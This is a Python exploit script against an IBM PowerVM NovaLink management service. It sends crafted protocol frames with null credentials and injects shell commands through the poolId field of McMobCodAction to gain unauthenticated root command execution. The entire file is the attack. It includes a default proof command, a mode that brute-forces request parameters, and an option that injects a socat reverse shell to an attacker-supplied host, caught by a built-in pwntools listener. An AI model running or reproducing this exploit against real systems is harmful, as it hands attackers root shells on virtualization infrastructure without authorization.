#!/usr/bin/env python3
# IBM PowerVM NovaLink IBM.HmcGopher::McMobCodAction _runMobQueryCmd command injection.
# Sean Bales
# caMobCodAction (HmcGopher, UNAUTHENT xrw) -> element[1].value==0x5a -> FUN_0013360c (_runMobQueryCmd)
import argparse, socket, struct, sys, threading, time

MAGIC=bytes.fromhex("50434d524443"); ACTION=0x04000022
MECHS=bytes([0x81,0x01,0,0,0,1,0,0,0,2]); NULL_CRED=bytes([0x82,0x02,0,0,0,0,0x01,0x01,0x20,0x0c])
CT_INT32,CT_UINT32,CT_CHAR_PTR,CT_BINARY=2,3,8,9
def _u32(v): return struct.pack("<I",v&0xffffffff)
def _set(b,o,v): struct.pack_into("<I",b,o,v&0xffffffff)
def frame(proto,seq,ce):
    h=bytearray(0x20); _set(h,0,0x20+len(ce)); h[4]=proto; h[5]=2; h[6]=1; h[8:0xe]=MAGIC
    _set(h,0x10,seq); _set(h,0x14,0x20); _set(h,0x18,1); _set(h,0x1c,0x20); return bytes(h)+ce
def _locale():
    strs=[b"C.UTF-8\x00"]*6; d0=8+7*4; offs=[]; dat=bytearray()
    for s in strs: offs.append(d0+len(dat)); dat+=s
    offs.append(d0+len(dat)); dat+=_u32(0x2e); blk=bytearray(_u32(0)*2)
    for o in offs: blk+=_u32(o)
    blk+=dat; _set(blk,0,len(blk)); return bytes(blk)
def start_0():
    loc,name=_locale(),b"raven-api\x00\x00\x00\x00"; M=0x60; lo=M; mo=lo+len(loc); no=mo+len(MECHS)
    ce=bytearray(no+len(name)); _set(ce,0,0);_set(ce,4,1);_set(ce,0xc,0);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff)
    _set(ce,0x20,lo);_set(ce,0x24,len(loc));_set(ce,0x28,mo);_set(ce,0x2c,len(MECHS))
    _set(ce,0x30,0x019c35);_set(ce,0x38,0x6a2d7311);_set(ce,0x40,0x0003fa84)
    _set(ce,0x44,0xc2);_set(ce,0x48,0xffff);_set(ce,0x4c,0x10);_set(ce,0x50,0xffff)
    ce[lo:lo+len(loc)]=loc; ce[mo:mo+len(MECHS)]=MECHS; ce[no:no+len(name)]=name; _set(ce,0,len(ce)); return bytes(ce)
def _simple(cmd,blob):
    ce=bytearray(0x28+len(blob)); _set(ce,4,cmd);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x20,0x28);_set(ce,0x24,len(blob)); ce[0x28:]=blob; _set(ce,0,len(ce)); return bytes(ce)
def _sd(elems):
    n=len(elems); d0=8+n*16; arr=bytearray(); dat=bytearray()
    for t,v in elems:
        if t in (CT_INT32,CT_UINT32): val=_u32(v)+_u32(0)
        else:
            b=(v if isinstance(v,(bytes,bytearray)) else v.encode())
            if t==CT_CHAR_PTR: b=bytes(b)+b"\x00"
            sz=(len(b)+7)&~7; off=d0+len(dat); dat+=bytes(b)+b"\x00"*(sz-len(b)); val=_u32(off)+_u32(sz)
        arr+=_u32(t)+_u32(0)+val
    return bytes(_u32(n)+_u32(0)+bytes(arr)+bytes(dat))

def mob_action(route, subop, poolid, eyecatcher=b"RAVEN"):
    name,cls=b"McMobCodAction",b"IBM.HmcGopher"
    pid = poolid if isinstance(poolid,(bytes,bytearray)) else poolid.encode()
    elems=[(CT_CHAR_PTR,eyecatcher),(CT_INT32,route),(CT_INT32,subop),(CT_INT32,0),
           (CT_CHAR_PTR,b"x"),(CT_CHAR_PTR,pid)]
    while len(elems) < 20:                       # element_count must be >= 0x11 (17)
        elems.append((CT_CHAR_PTR,b"z"))
    sd=_sd(elems)
    no=0x48+len(sd); co=no+len(name)+1
    tail=bytearray(sd+name+b"\x00"+cls+b"\x00"); tail+=b"\x00"*((-(0x48+len(tail)))%8)
    ce=bytearray(0x48)+tail
    _set(ce,4,ACTION);_set(ce,0x10,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x14,0x48);_set(ce,0x18,len(sd));_set(ce,0x20,co);_set(ce,0x34,no);_set(ce,0x3c,len(sd))
    _set(ce,0,len(ce)); return bytes(ce)

def _recv(s,dl):
    def rd(n):
        b=b""
        while len(b)<n:
            try: s.settimeout(max(0.05,dl-time.time())); c=s.recv(n-len(b))
            except OSError: break
            if not c: break
            b+=c
        return b
    h=rd(4)
    if len(h)<4: return b""
    n=struct.unpack("<I",h)[0]; return h+(rd(n-4) if 0<n<=0x40000 else b"")

def fire(host,port,route,subop,poolid,eye=b"RAVEN"):
    chain=[start_0(),_simple(0x2d,MECHS),_simple(0x02,NULL_CRED),mob_action(route,subop,poolid,eye)]
    s=socket.create_connection((host,port),timeout=8); dl=time.time()+20
    for i,ce in enumerate(chain[:-1]):
        s.sendall(frame(0x10,i+1,ce))
        if not _recv(s,dl): s.close(); return False
    s.sendall(frame(0x10,4,chain[-1])); _recv(s,dl); s.close(); return True

def pop_shell(lport, fire_thunk):
    try:
        from pwn import listen, context
    except ImportError:
        sys.exit("[-] -s needs pwntools:  pip install --break-system-packages pwntools")
    context.log_level="info"; l=listen(int(lport))
    threading.Thread(target=fire_thunk,daemon=True).start()
    l.wait_for_connection(); l.interactive()

if __name__=="__main__":
    ap=argparse.ArgumentParser(description="McMobCodAction _runMobQueryCmd unauth root command injection")
    ap.add_argument("host"); ap.add_argument("port",nargs="?",type=int,default=657)
    ap.add_argument("-c",metavar="CMD",default="id>/tmp/MOBPWN",help="command injected via poolId (metachars OK)")
    ap.add_argument("-s",metavar="LHOST:LPORT",help="reverse shell (socat pty) with a built-in pwntools listener")
    ap.add_argument("--route",type=lambda x:int(x,0),default=0x5a)
    ap.add_argument("--subop",type=lambda x:int(x,0),default=0x67)
    ap.add_argument("--sweep",action="store_true",help="sweep route x subop to find the firing combo")
    a=ap.parse_args()
    if a.s:
        lh,lp=a.s.rsplit(":",1)
        inj=f";socat tcp:{lh}:{lp} exec:'bash -li',pty,stderr,setsid,sigint,sane #".encode()
        print(f"[*] reverse shell -> {a.s}  poolId={inj!r}")
        pop_shell(lp, lambda: fire(a.host,a.port,a.route,a.subop,inj)); sys.exit(0)
    inj=f";{a.c} #".encode()
    if a.sweep:
        for route in (0x5a,0x60,0x7b):
            for subop in range(0x5b,0x6b):
                print(f"[*] route=0x{route:x} subop=0x{subop:x} poolId={inj!r}")
                fire(a.host,a.port,route,subop,inj); time.sleep(0.25)
    else:
        print(f"[*] route=0x{a.route:x} subop=0x{a.subop:x}  poolId={inj!r}")
        print(f"[*] popen: /opt/hsc/bin/mccodopint -o hasupdate --poolid {inj.decode()} --eyecatcher RAVEN")
        fire(a.host,a.port,a.route,a.subop,inj)
